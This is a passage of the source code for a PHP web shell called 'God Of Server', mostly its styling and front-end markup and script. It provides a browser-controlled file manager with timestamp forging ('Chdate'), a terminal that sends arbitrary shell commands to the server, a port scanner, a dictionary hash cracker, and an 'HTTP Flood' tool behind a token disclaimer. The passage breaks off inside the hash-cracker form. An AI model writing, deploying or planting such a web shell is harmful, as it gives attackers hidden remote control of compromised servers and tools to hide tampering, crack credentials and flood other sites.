        }
        
        .file-item {
            display: grid;
            grid-template-columns: 2fr 1fr 1fr 1.5fr 1fr 4fr;
            padding: 14px 20px;
            border-bottom: 1px solid var(--border-light);
            align-items: center;
            transition: all 0.2s;
            font-family: 'JetBrains Mono', monospace;
            font-size: 13px;
        }
        
        .file-item:hover {
            background: rgba(255, 46, 99, 0.05);
        }
        
        .file-item:last-child {
            border-bottom: none;
        }
        
        .file-name {
            color: var(--text-primary);
            word-break: break-all;
            display: flex;
            align-items: center;
            gap: 8px;
            cursor: pointer;
            padding: 5px 10px;
            border-radius: 6px;
            transition: background 0.2s;
        }
        
        .file-name:hover {
            background: rgba(255, 46, 99, 0.1);
        }
        
        .file-name.folder {
            color: var(--accent-blue);
        }
        
        .file-name.file {
            color: var(--accent-green);
        }
        
        .file-icon {
            width: 20px;
            height: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 16px;
        }
        
        .file-actions {
            display: flex;
            gap: 6px;
            flex-wrap: wrap;
        }
        
        .file-action-btn {
            padding: 6px 10px;
            font-size: 11px;
            border-radius: 6px;
            border: none;
            cursor: pointer;
            transition: all 0.2s;
            white-space: nowrap;
            font-family: 'Inter', sans-serif;
            font-weight: 500;
        }
        
        .badge {
            padding: 4px 10px;
            border-radius: 20px;
            font-size: 11px;
            font-weight: 500;
            display: inline-block;
        }
        
        .badge-folder {
            background: rgba(74, 111, 255, 0.15);
            color: var(--accent-blue);
            border: 1px solid rgba(74, 111, 255, 0.3);
        }
        
        .badge-file {
            background: rgba(8, 217, 166, 0.15);
            color: var(--accent-green);
            border: 1px solid rgba(8, 217, 166, 0.3);
        }
        
        .badge-hidden {
            background: rgba(160, 160, 192, 0.15);
            color: var(--text-secondary);
            border: 1px solid rgba(160, 160, 192, 0.3);
        }
        
        /* Terminal Container */
        .terminal-container {
            background: #000;
            border-radius: 12px;
            overflow: hidden;
            border: 1px solid var(--border-color);
            font-family: 'JetBrains Mono', monospace;
        }
        
        .terminal-header {
            background: var(--bg-tertiary);
            padding: 12px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid var(--border-color);
            font-size: 13px;
        }
        
        .terminal-dots {
            display: flex;
            gap: 8px;
        }
        
        .terminal-dot {
            width: 12px;
            height: 12px;
            border-radius: 50%;
        }
        
        .dot-red { background: #ff5f57; }
        .dot-yellow { background: #ffbd2e; }
        .dot-green { background: #28ca42; }
        
        .terminal-output {
            height: 400px;
            overflow-y: auto;
            padding: 20px;
            font-size: 13px;
            color: #08d9a6;
            background: #000;
            white-space: pre-wrap;
            word-wrap: break-word;
            line-height: 1.4;
        }
        
        .terminal-output:empty::after {
            content: 'Terminal ready. Type commands below.';
            color: #707090;
            font-style: italic;
        }
        
        .terminal-line {
            margin-bottom: 2px;
            font-family: 'JetBrains Mono', monospace;
        }
        
        .prompt {
            color: #4a6fff;
            font-weight: bold;
            display: inline;
        }
        
        .command {
            color: #08d9a6;
            display: inline;
        }
        
        .output {
            color: #a0a0c0;
            display: block;
            margin-top: 4px;
            font-family: 'JetBrains Mono', monospace;
            white-space: pre-wrap;
            word-break: break-all;
        }
        
        .terminal-input {
            display: flex;
            gap: 10px;
            padding: 20px;
            background: var(--bg-tertiary);
            border-top: 1px solid var(--border-color);
        }
        
        .terminal-input input {
            flex: 1;
            padding: 12px;
            background: var(--bg-secondary);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            color: var(--text-primary);
            font-family: 'JetBrains Mono', monospace;
            font-size: 13px;
        }
        
        .terminal-input input:focus {
            outline: none;
            border-color: var(--accent-red);
        }
        
        /* Tools Grid */
        .tools-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
            gap: 16px;
            margin-top: 20px;
        }
        
        .tool-card {
            background: var(--bg-card);
            padding: 24px;
            border-radius: 12px;
            border: 1px solid var(--border-color);
            transition: all 0.3s;
            cursor: pointer;
        }
        
        .tool-card:hover {
            transform: translateY(-5px);
            border-color: var(--accent-red);
            box-shadow: var(--shadow-lg);
        }
        
        .tool-icon {
            font-size: 32px;
            margin-bottom: 16px;
            color: var(--accent-blue);
        }
        
        .tool-title {
            font-family: 'Inter', sans-serif;
            font-weight: 600;
            font-size: 16px;
            color: var(--text-primary);
            margin-bottom: 8px;
        }
        
        .tool-desc {
            font-family: 'Inter', sans-serif;
            color: var(--text-secondary);
            font-size: 13px;
            line-height: 1.5;
        }
        
        /* Modal */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        
        .modal.active {
            display: flex;
        }
        
        .modal-content {
            background: var(--bg-card);
            border-radius: 16px;
            padding: 30px;
            min-width: 500px;
            max-width: 800px;
            max-height: 80vh;
            overflow-y: auto;
            border: 1px solid var(--border-color);
            box-shadow: var(--shadow-lg);
        }
        
        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 24px;
            padding-bottom: 16px;
            border-bottom: 1px solid var(--border-color);
        }
        
        .modal-title {
            font-family: 'Inter', sans-serif;
            font-weight: 600;
            font-size: 18px;
            color: var(--text-primary);
        }
        
        .modal-close {
            background: none;
            border: none;
            color: var(--text-muted);
            font-size: 24px;
            cursor: pointer;
            line-height: 1;
            transition: color 0.2s;
        }
        
        .modal-close:hover {
            color: var(--accent-red);
        }
        
        .form-group {
            margin-bottom: 16px;
        }
        
        .form-label {
            font-family: 'Inter', sans-serif;
            font-weight: 500;
            font-size: 13px;
            display: block;
            margin-bottom: 8px;
            color: var(--text-primary);
        }
        
        .form-control {
            font-family: 'JetBrains Mono', monospace;
            width: 100%;
            padding: 12px;
            background: var(--bg-secondary);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            color: var(--text-primary);
            font-size: 13px;
        }
        
        .form-control:focus {
            outline: none;
            border-color: var(--accent-red);
            box-shadow: 0 0 0 2px rgba(255, 46, 99, 0.1);
        }
        
        textarea.form-control {
            min-height: 200px;
            resize: vertical;
        }
        
        .alert {
            padding: 16px;
            border-radius: 12px;
            margin-bottom: 20px;
            display: none;
            font-family: 'Inter', sans-serif;
            font-size: 13px;
            border: 1px solid transparent;
        }
        
        .alert-success {
            background: rgba(8, 217, 166, 0.1);
            border-color: var(--accent-green);
            color: var(--accent-green);
        }
        
        .alert-error {
            background: rgba(255, 46, 99, 0.1);
            border-color: var(--accent-red);
            color: var(--accent-red);
        }
        
        .alert-info {
            background: rgba(74, 111, 255, 0.1);
            border-color: var(--accent-blue);
            color: var(--accent-blue);
        }
        
        .alert-warning {
            background: rgba(255, 179, 71, 0.1);
            border-color: var(--accent-yellow);
            color: var(--accent-yellow);
        }
        
        .results-container {
            margin-top: 20px;
            max-height: 400px;
            overflow-y: auto;
            background: var(--bg-primary);
            border-radius: 8px;
            padding: 16px;
            border: 1px solid var(--border-color);
        }
        
        .result-item {
            padding: 12px;
            margin-bottom: 8px;
            background: var(--bg-tertiary);
            border-radius: 6px;
            border-left: 4px solid var(--accent-green);
        }
        
        .result-item.error {
            border-left-color: var(--accent-red);
        }
        
        .result-item.warning {
            border-left-color: var(--accent-yellow);
        }
        
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
            gap: 16px;
            margin: 20px 0;
        }
        
        .stat-card {
            background: var(--bg-card);
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            border: 1px solid var(--border-color);
        }
        
        .stat-value {
            font-family: 'JetBrains Mono', monospace;
            font-size: 24px;
            font-weight: 700;
            color: var(--accent-green);
            margin-bottom: 8px;
        }
        
        .stat-label {
            font-size: 12px;
            color: var(--text-muted);
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        @media (max-width: 1200px) {
            .file-header, .file-item {
                grid-template-columns: 1fr;
                gap: 10px;
            }
            
            .modal-content {
                min-width: 90%;
                margin: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <header class="header">
            <div class="logo-container">
                <div class="logo"><i class="fas fa-crown"></i> God Of Server</div>
                <div class="server-status">
                    <div class="status-indicator"></div>
                    <span style="color: var(--accent-green); font-family: 'JetBrains Mono', monospace;">LIVE</span>
                </div>
            </div>
            
            <div class="server-info-header"><?= nl2br(htmlspecialchars($server_info_header)) ?></div>
            
            <div class="nav-tabs">
                <button class="nav-btn active" data-section="filemanager">
                    <i class="fas fa-folder"></i> File Manager
                </button>
                <button class="nav-btn" data-section="terminal">
                    <i class="fas fa-terminal"></i> Terminal
                </button>
                <button class="nav-btn" data-section="tools">
                    <i class="fas fa-tools"></i> Advanced Tools
                </button>
                <button class="nav-btn" data-section="network">
                    <i class="fas fa-network-wired"></i> Network
                </button>
                <button class="nav-btn" data-section="security">
                    <i class="fas fa-shield-alt"></i> Security
                </button>
                <button class="nav-btn" data-section="crypto">
                    <i class="fas fa-lock"></i> Crypto
                </button>
                <button class="nav-btn" data-section="stress">
                    <i class="fas fa-bomb"></i> Stress Test
                </button>
                <button class="nav-btn" data-section="system">
                    <i class="fas fa-server"></i> System Info
                </button>
            </div>
        </header>
        
        <div class="alert" id="global-alert"></div>
        
        <!-- File Manager Section -->
        <section id="filemanager" class="content-section active">
            <h2 class="section-title"><i class="fas fa-folder"></i> File Manager</h2>
            
            <div class="path-navigation">
                <div class="path-breadcrumb">
                    <a href="?auth=<?= urlencode($AUTH_KEY) ?>&dir=/" class="path-segment">
                        <i class="fas fa-home"></i> /
                    </a>
                    <?php
                    $path_parts = explode('/', trim($directory_contents['current_path'], '/'));
                    $current_path = '';
                    foreach ($path_parts as $index => $part) {
                        if ($part === '') continue;
                        $current_path .= '/' . $part;
                        echo '<span style="color: var(--text-muted);">/</span>';
                        echo '<a href="?auth=' . urlencode($AUTH_KEY) . '&dir=' . urlencode($current_path) . '" class="path-segment">' . htmlspecialchars($part) . '</a>';
                    }
                    ?>
                </div>
                
                <div class="path-actions">
                    <button class="btn btn-primary" onclick="loadDirectory('<?= htmlspecialchars($directory_contents['home_path']) ?>')">
                        <i class="fas fa-home"></i> Home
                    </button>
                    <button class="btn btn-warning" onclick="loadDirectory('<?= htmlspecialchars($directory_contents['parent_path']) ?>')">
                        <i class="fas fa-level-up-alt"></i> UP
                    </button>
                    <button class="btn btn-success" onclick="showUploadModal()">
                        <i class="fas fa-upload"></i> Upload
                    </button>
                    <button class="btn btn-purple" onclick="showCreateFileModal()">
                        <i class="fas fa-file-plus"></i> New File
                    </button>
                    <button class="btn btn-purple" onclick="showCreateFolderModal()">
                        <i class="fas fa-folder-plus"></i> New Folder
                    </button>
                </div>
            </div>
            
            <div class="file-list">
                <div class="file-header">
                    <div>Name</div>
                    <div>Type</div>
                    <div>Size</div>
                    <div>Modified</div>
                    <div>Permissions</div>
                    <div>Actions</div>
                </div>
                
                <!-- Directories -->
                <?php foreach ($directory_contents['directories'] as $dir): ?>
                <div class="file-item">
                    <div class="file-name folder" onclick="loadDirectory('<?= htmlspecialchars(addslashes($dir['path'])) ?>')">
                        <div class="file-icon">
                            <i class="fas fa-folder"></i>
                        </div>
                        <?= htmlspecialchars($dir['name']) ?>
                    </div>
                    <div><span class="badge badge-folder">DIR</span></div>
                    <div><?= htmlspecialchars($dir['size']) ?></div>
                    <div><?= htmlspecialchars($dir['modified']) ?></div>
                    <div><code><?= htmlspecialchars($dir['permissions']) ?></code></div>
                    <div class="file-actions">
                        <button class="file-action-btn btn-warning" onclick="renameItem('<?= htmlspecialchars($dir['path']) ?>')">
                            <i class="fas fa-edit"></i> Rename
                        </button>
                        <button class="file-action-btn btn-danger" onclick="deleteItem('<?= htmlspecialchars($dir['path']) ?>')">
                            <i class="fas fa-trash"></i> Delete
                        </button>
                        <button class="file-action-btn btn-success" onclick="chmodItem('<?= htmlspecialchars($dir['path']) ?>')">
                            <i class="fas fa-key"></i> Chmod
                        </button>
                        <button class="file-action-btn btn-warning" onclick="chdateItem('<?= htmlspecialchars($dir['path']) ?>')">
                            <i class="fas fa-clock"></i> Chdate
                        </button>
                    </div>
                </div>
                <?php endforeach; ?>
                
                <!-- Hidden Directories -->
                <?php foreach ($directory_contents['hidden_directories'] as $dir): ?>
                <div class="file-item">
                    <div class="file-name folder" onclick="loadDirectory('<?= htmlspecialchars(addslashes($dir['path'])) ?>')">
                        <div class="file-icon">
                            <i class="fas fa-folder-minus"></i>
                        </div>
                        <?= htmlspecialchars($dir['name']) ?>
                    </div>
                    <div><span class="badge badge-hidden">HIDDEN</span></div>
                    <div><?= htmlspecialchars($dir['size']) ?></div>
                    <div><?= htmlspecialchars($dir['modified']) ?></div>
                    <div><code><?= htmlspecialchars($dir['permissions']) ?></code></div>
                    <div class="file-actions">
                        <button class="file-action-btn btn-warning" onclick="renameItem('<?= htmlspecialchars($dir['path']) ?>')">
                            <i class="fas fa-edit"></i> Rename
                        </button>
                        <button class="file-action-btn btn-danger" onclick="deleteItem('<?= htmlspecialchars($dir['path']) ?>')">
                            <i class="fas fa-trash"></i> Delete
                        </button>
                        <button class="file-action-btn btn-success" onclick="chmodItem('<?= htmlspecialchars($dir['path']) ?>')">
                            <i class="fas fa-key"></i> Chmod
                        </button>
                        <button class="file-action-btn btn-warning" onclick="chdateItem('<?= htmlspecialchars($dir['path']) ?>')">
                            <i class="fas fa-clock"></i> Chdate
                        </button>
                    </div>
                </div>
                <?php endforeach; ?>
                
                <!-- Files -->
                <?php foreach ($directory_contents['files'] as $file): 
                    $icon_class = 'file';
                    if (in_array($file['extension'], ['php', 'php3', 'php4', 'php5', 'php7', 'phtml'])) {
                        $icon_class = 'php';
                    } elseif (in_array($file['extension'], ['js', 'jsx', 'ts'])) {
                        $icon_class = 'js';
                    } elseif (in_array($file['extension'], ['html', 'htm'])) {
                        $icon_class = 'html';
                    } elseif (in_array($file['extension'], ['css', 'scss', 'sass'])) {
                        $icon_class = 'css';
                    } elseif (in_array($file['extension'], ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'svg'])) {
                        $icon_class = 'image';
                    } elseif (in_array($file['extension'], ['zip', 'tar', 'gz', 'rar', '7z'])) {
                        $icon_class = 'archive';
                    }
                ?>
                <div class="file-item">
                    <div class="file-name file" onclick="editFile('<?= htmlspecialchars(addslashes($file['path'])) ?>')">
                        <div class="file-icon">
                            <?php if ($icon_class === 'php'): ?>
                                <i class="fab fa-php"></i>
                            <?php elseif ($icon_class === 'js'): ?>
                                <i class="fab fa-js"></i>
                            <?php elseif ($icon_class === 'html'): ?>
                                <i class="fab fa-html5"></i>
                            <?php elseif ($icon_class === 'css'): ?>
                                <i class="fab fa-css3-alt"></i>
                            <?php elseif ($icon_class === 'image'): ?>
                                <i class="fas fa-image"></i>
                            <?php elseif ($icon_class === 'archive'): ?>
                                <i class="fas fa-file-archive"></i>
                            <?php else: ?>
                                <i class="fas fa-file"></i>
                            <?php endif; ?>
                        </div>
                        <?= htmlspecialchars($file['name']) ?>
                    </div>
                    <div><span class="badge badge-file"><?= strtoupper($file['extension'] ?: 'FILE') ?></span></div>
                    <div><?= htmlspecialchars($file['size']) ?></div>
                    <div><?= htmlspecialchars($file['modified']) ?></div>
                    <div><code><?= htmlspecialchars($file['permissions']) ?></code></div>
                    <div class="file-actions">
                        <button class="file-action-btn btn-primary" onclick="editFile('<?= htmlspecialchars($file['path']) ?>')">
                            <i class="fas fa-edit"></i> Edit
                        </button>
                        <button class="file-action-btn btn-primary" onclick="viewFile('<?= htmlspecialchars($file['path']) ?>')">
                            <i class="fas fa-eye"></i> View
                        </button>
                        <button class="file-action-btn btn-warning" onclick="renameItem('<?= htmlspecialchars($file['path']) ?>')">
                            <i class="fas fa-edit"></i> Rename
                        </button>
                        <button class="file-action-btn btn-danger" onclick="deleteItem('<?= htmlspecialchars($file['path']) ?>')">
                            <i class="fas fa-trash"></i> Delete
                        </button>
                        <button class="file-action-btn btn-success" onclick="chmodItem('<?= htmlspecialchars($file['path']) ?>')">
                            <i class="fas fa-key"></i> Chmod
                        </button>
                        <button class="file-action-btn btn-warning" onclick="chdateItem('<?= htmlspecialchars($file['path']) ?>')">
                            <i class="fas fa-clock"></i> Chdate
                        </button>
                    </div>
                </div>
                <?php endforeach; ?>
            </div>
        </section>
        
        <!-- Terminal Section (EMPTY INITIALLY) -->
        <section id="terminal" class="content-section">
            <h2 class="section-title"><i class="fas fa-terminal"></i> Terminal</h2>
            <div class="terminal-container">
                <div class="terminal-header">
                    <div class="terminal-dots">
                        <div class="terminal-dot dot-red"></div>
                        <div class="terminal-dot dot-yellow"></div>
                        <div class="terminal-dot dot-green"></div>
                    </div>
                    <div>Current: <?= htmlspecialchars($directory_contents['current_path']) ?></div>
                </div>
                <div class="terminal-output" id="terminal-output">
                    <!-- EMPTY - No initial command output -->
                </div>
                <div class="terminal-input">
                    <input type="text" id="terminal-command" placeholder="Type command and press Enter..." autocomplete="off">
                    <button class="btn btn-primary" onclick="executeTerminalCommand()">
                        <i class="fas fa-play"></i> Execute
                    </button>
                    <button class="btn btn-danger" onclick="executeTerminalCommand(true)">
                        <i class="fas fa-play-circle"></i> Background
                    </button>
                    <button class="btn btn-warning" onclick="clearTerminal()">
                        <i class="fas fa-broom"></i> Clear
                    </button>
                </div>
            </div>
        </section>
        
        <!-- Advanced Tools Section -->
        <section id="tools" class="content-section">
            <h2 class="section-title"><i class="fas fa-tools"></i> Advanced Tools</h2>
            <div class="alert alert-info">
                <i class="fas fa-info-circle"></i> Collection of advanced system and network tools
            </div>
            
            <div class="tools-grid">
                <div class="tool-card" onclick="showToolModal('port_scanner')">
                    <div class="tool-icon">
                        <i class="fas fa-search"></i>
                    </div>
                    <div class="tool-title">Port Scanner</div>
                    <div class="tool-desc">Scan for open ports on target host with customizable port ranges</div>
                </div>
                
                <div class="tool-card" onclick="showToolModal('hash_cracker')">
                    <div class="tool-icon">
                        <i class="fas fa-unlock"></i>
                    </div>
                    <div class="tool-title">Hash Cracker</div>
                    <div class="tool-desc">Crack MD5, SHA1, SHA256 hashes using dictionary attacks</div>
                </div>
                
                <div class="tool-card" onclick="showToolModal('encryption_tool')">
                    <div class="tool-icon">
                        <i class="fas fa-lock"></i>
                    </div>
                    <div class="tool-title">Encryption Tool</div>
                    <div class="tool-desc">AES encryption/decryption with key management</div>
                </div>
            </div>
        </section>
        
        <!-- Network Tools Section -->
        <section id="network" class="content-section">
            <h2 class="section-title"><i class="fas fa-network-wired"></i> Network Tools</h2>
            
            <div class="tools-grid">
                <div class="tool-card" onclick="showToolModal('ping_tool')">
                    <div class="tool-icon">
                        <i class="fas fa-wifi"></i>
                    </div>
                    <div class="tool-title">Ping Test</div>
                    <div class="tool-desc">Test connectivity to remote hosts with latency statistics</div>
                </div>
                
                <div class="tool-card" onclick="showToolModal('port_scanner')">
                    <div class="tool-icon">
                        <i class="fas fa-search"></i>
                    </div>
                    <div class="tool-title">Port Scanner</div>
                    <div class="tool-desc">Scan for open ports on target host</div>
                </div>
            </div>
        </section>
        
        <!-- Security Tools Section -->
        <section id="security" class="content-section">
            <h2 class="section-title"><i class="fas fa-shield-alt"></i> Security Tools</h2>
            
            <div class="tools-grid">
                <div class="tool-card" onclick="showToolModal('hash_cracker')">
                    <div class="tool-icon">
                        <i class="fas fa-unlock"></i>
                    </div>
                    <div class="tool-title">Hash Cracker</div>
                    <div class="tool-desc">Crack common hashes using dictionary attacks</div>
                </div>
            </div>
        </section>
        
        <!-- Crypto Tools Section -->
        <section id="crypto" class="content-section">
            <h2 class="section-title"><i class="fas fa-lock"></i> Cryptography Tools</h2>
            
            <div class="tools-grid">
                <div class="tool-card" onclick="showToolModal('encryption_tool')">
                    <div class="tool-icon">
                        <i class="fas fa-key"></i>
                    </div>
                    <div class="tool-title">AES Encryption</div>
                    <div class="tool-desc">Encrypt data using AES-256-CBC with custom keys</div>
                </div>
                
                <div class="tool-card" onclick="showToolModal('decryption_tool')">
                    <div class="tool-icon">
                        <i class="fas fa-unlock"></i>
                    </div>
                    <div class="tool-title">AES Decryption</div>
                    <div class="tool-desc">Decrypt AES-256-CBC encrypted data</div>
                </div>
            </div>
        </section>
        
        <!-- Stress Testing Section -->
        <section id="stress" class="content-section">
            <h2 class="section-title"><i class="fas fa-bomb"></i> Stress Testing Tools</h2>
            <div class="alert alert-warning">
                <i class="fas fa-exclamation-triangle"></i> Use responsibly and only on systems you own or have permission to test
            </div>
            
            <div class="tools-grid">
                <div class="tool-card" onclick="showToolModal('http_flood')">
                    <div class="tool-icon">
                        <i class="fas fa-bolt"></i>
                    </div>
                    <div class="tool-title">HTTP Flood</div>
                    <div class="tool-desc">Simulate high traffic load on web servers</div>
                </div>
            </div>
        </section>
        
        <!-- System Info Section -->
        <section id="system" class="content-section">
            <h2 class="section-title"><i class="fas fa-server"></i> System Information</h2>
            
            <div class="tools-grid">
                <div class="tool-card" onclick="getSystemInfo()">
                    <div class="tool-icon">
                        <i class="fas fa-info-circle"></i>
                    </div>
                    <div class="tool-title">Detailed System Info</div>
                    <div class="tool-desc">Get comprehensive system information and statistics</div>
                </div>
            </div>
            
            <div id="system-info-results" style="margin-top: 30px; display: none;">
                <h3 class="section-title" style="font-size: 16px;">System Information</h3>
                <div class="results-container" id="system-info-output"></div>
            </div>
        </section>
        
        <!-- MODAL FOR TOOLS -->
        <div class="modal" id="tool-modal">
            <div class="modal-content">
                <div class="modal-header">
                    <div class="modal-title" id="tool-modal-title">Tool</div>
                    <button class="modal-close" onclick="hideModal('tool-modal')">×</button>
                </div>
                <div id="tool-modal-content">
                    <!-- Dynamic content will be loaded here -->
                </div>
            </div>
        </div>
        
        <!-- Existing Modals -->
        <div class="modal" id="edit-file-modal">
            <div class="modal-content">
                <div class="modal-header">
                    <div class="modal-title">Edit File</div>
                    <button class="modal-close" onclick="hideModal('edit-file-modal')">×</button>
                </div>
                <div class="form-group">
                    <label class="form-label">Path</label>
                    <input type="text" id="edit-file-path" class="form-control" readonly>
                </div>
                <div class="form-group">
                    <label class="form-label">Content</label>
                    <textarea id="edit-file-content" class="form-control" spellcheck="false" rows="20"></textarea>
                </div>
                <div class="path-actions">
                    <button class="btn btn-success" onclick="saveFile()">Save Changes</button>
                </div>
            </div>
        </div>
        
        <!-- Other existing modals -->
        <div class="modal" id="rename-modal">
            <div class="modal-content">
                <div class="modal-header">
                    <div class="modal-title">Rename Item</div>
                    <button class="modal-close" onclick="hideModal('rename-modal')">×</button>
                </div>
                <div class="form-group">
                    <label class="form-label">Current Path</label>
                    <input type="text" id="rename-old-path" class="form-control" readonly>
                </div>
                <div class="form-group">
                    <label class="form-label">New Name</label>
                    <input type="text" id="rename-new-name" class="form-control" autocomplete="off">
                </div>
                <button class="btn btn-success" onclick="performRename()">Rename</button>
            </div>
        </div>
        
        <!-- Add other modals as needed -->
        
    </div>
    
    <!-- JavaScript -->
    <script>
        // Clear terminal on initial load
        document.addEventListener('DOMContentLoaded', function() {
            document.getElementById('terminal-output').innerHTML = '';
        });
        
        // Clear terminal function
        function clearTerminal() {
            document.getElementById('terminal-output').innerHTML = '';
        }
        
        // Navigation tabs
        document.querySelectorAll('.nav-btn').forEach(btn => {
            btn.addEventListener('click', () => {
                document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
                document.querySelectorAll('.content-section').forEach(s => s.classList.remove('active'));
                
                btn.classList.add('active');
                document.getElementById(btn.dataset.section).classList.add('active');
                
                if (btn.dataset.section === 'terminal') {
                    setTimeout(() => document.getElementById('terminal-command').focus(), 100);
                }
            });
        });
        
        // Terminal input handler
        document.getElementById('terminal-command').addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                executeTerminalCommand();
            }
        });
        
        // Helper functions
        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }
        
        function showAlert(message, type = 'info', duration = 5000) {
            const alert = document.getElementById('global-alert');
            alert.textContent = message;
            alert.className = `alert alert-${type}`;
            alert.style.display = 'block';
            
            setTimeout(() => {
                alert.style.display = 'none';
            }, duration);
        }
        
        // File manager functions
        function loadDirectory(path = null) {
            if (!path) path = '<?= addslashes($directory_contents['current_path']) ?>';
            
            fetch('', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'action=change_dir&path=' + encodeURIComponent(path)
            })
            .then(response => response.json())
            .then(data => {
                if (data.success && data.redirect) {
                    window.location.href = data.redirect;
                } else {
                    showAlert('Failed to change directory', 'error');
                }
            });
        }
        
        function editFile(path) {
            fetch('', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'action=read_file&path=' + encodeURIComponent(path)
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    document.getElementById('edit-file-path').value = path;
                    document.getElementById('edit-file-content').value = data.content;
                    showModal('edit-file-modal');
                    setTimeout(() => document.getElementById('edit-file-content').focus(), 100);
                } else {
                    showAlert('Cannot read file: ' + data.message, 'error');
                }
            });
        }
        
        function viewFile(path) {
            const encodedPath = btoa(path);
            window.open(`?auth=<?= $AUTH_KEY ?>&view=1&path=${encodedPath}`, '_blank');
        }
        
        function saveFile() {
            const path = document.getElementById('edit-file-path').value;
            const content = document.getElementById('edit-file-content').value;
            
            fetch('', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'action=write_file&path=' + encodeURIComponent(path) + '&content=' + encodeURIComponent(content)
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    hideModal('edit-file-modal');
                    showAlert('✓ File saved successfully', 'success');
                    setTimeout(() => location.reload(), 1000);
                } else {
                    showAlert('✗ Save failed: ' + data.message, 'error');
                }
            });
        }
        
        function deleteItem(path) {
            if (!confirm('Are you sure you want to delete this item?')) return;
            
            fetch('', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'action=delete&path=' + encodeURIComponent(path)
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    showAlert('✓ Item deleted successfully', 'success');
                    setTimeout(() => location.reload(), 1000);
                } else {
                    showAlert('✗ Delete failed: ' + data.message, 'error');
                }
            });
        }
        
        function renameItem(path) {
            document.getElementById('rename-old-path').value = path;
            const parts = path.split('/');
            document.getElementById('rename-new-name').value = parts[parts.length - 1];
            showModal('rename-modal');
            setTimeout(() => document.getElementById('rename-new-name').focus(), 100);
        }
        
        function performRename() {
            const oldPath = document.getElementById('rename-old-path').value;
            const newName = document.getElementById('rename-new-name').value.trim();
            
            if (!newName) {
                showAlert('Please enter a new name', 'error');
                return;
            }
            
            const newPath = oldPath.substring(0, oldPath.lastIndexOf('/')) + '/' + newName;
            
            fetch('', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'action=rename&old_path=' + encodeURIComponent(oldPath) + '&new_path=' + encodeURIComponent(newPath)
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    hideModal('rename-modal');
                    showAlert('✓ Item renamed successfully', 'success');
                    setTimeout(() => location.reload(), 1000);
                } else {
                    showAlert('✗ Rename failed: ' + data.message, 'error');
                }
            });
        }
        
        // Terminal functions
        function executeTerminalCommand(background = false) {
            const command = document.getElementById('terminal-command').value.trim();
            if (!command) return;
            
            const output = document.getElementById('terminal-output');
            const line = document.createElement('div');
            line.className = 'terminal-line';
            line.innerHTML = `<span class="prompt">$</span> <span class="command">${escapeHtml(command)}</span>`;
            output.appendChild(line);
            
            fetch('', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'action=execute_command&command=' + encodeURIComponent(command) + '&background=' + (background ? '1' : '0')
            })
            .then(response => response.json())
            .then(data => {
                const outputDiv = document.createElement('div');
                outputDiv.className = 'output';
                
                if (data.change_dir) {
                    // If cd command succeeded, reload page with new directory
                    outputDiv.textContent = data.output;
                    line.appendChild(outputDiv);
                    output.scrollTop = output.scrollHeight;
                    
                    setTimeout(() => {
                        window.location.href = `?auth=<?= urlencode($AUTH_KEY) ?>&dir=${encodeURIComponent(data.change_dir)}`;
                    }, 500);
                } else {
                    outputDiv.textContent = data.output || '(no output)';
                    line.appendChild(outputDiv);
                    
                    output.scrollTop = output.scrollHeight;
                    document.getElementById('terminal-command').value = '';
                    
                    if (background) {
                        showAlert('✓ Command running in background', 'success');
                    }
                }
            });
        }
        
        // Show tool modal
        function showToolModal(toolName) {
            const modal = document.getElementById('tool-modal');
            const title = document.getElementById('tool-modal-title');
            const content = document.getElementById('tool-modal-content');
            
            let toolTitle = '';
            let toolContent = '';
            
            switch(toolName) {
                case 'port_scanner':
                    toolTitle = '<i class="fas fa-search"></i> Port Scanner';
                    toolContent = `
                        <div class="form-group">
                            <label class="form-label">Target Host</label>
                            <input type="text" id="scan-target" class="form-control" value="127.0.0.1" placeholder="IP or hostname">
                        </div>
                        <div class="form-group">
                            <label class="form-label">Port Range</label>
                            <input type="text" id="scan-ports" class="form-control" value="1-100" placeholder="e.g., 1-1000 or 80,443,8080">
                        </div>
                        <div class="form-group">
                            <label class="form-label">Timeout (seconds)</label>
                            <input type="number" id="scan-timeout" class="form-control" value="1" min="1" max="10">
                        </div>
                        <button class="btn btn-primary" onclick="runPortScan()">
                            <i class="fas fa-play"></i> Start Scan
                        </button>
                        <div id="port-scan-results" class="results-container" style="display: none; margin-top: 20px;"></div>
                    `;
                    break;
                    
                case 'hash_cracker':
                    toolTitle = '<i class="fas fa-unlock"></i> Hash Cracker';
                    toolContent = `
                        <div class="form-group">
                            <label class="form-label">Hash to Crack</label>
                            <input type="text" id="hash-input" class="form-control" placeholder="Enter MD5, SHA1, or SHA256 hash">
                        </div>
                        <div class="form-group">
                            <label class="form-label">Algorithm</label>
                            <select id="hash-algorithm" class="form-control">
                                <option value="md5">MD5</option>
                                <option value="sha1">SHA1</option>
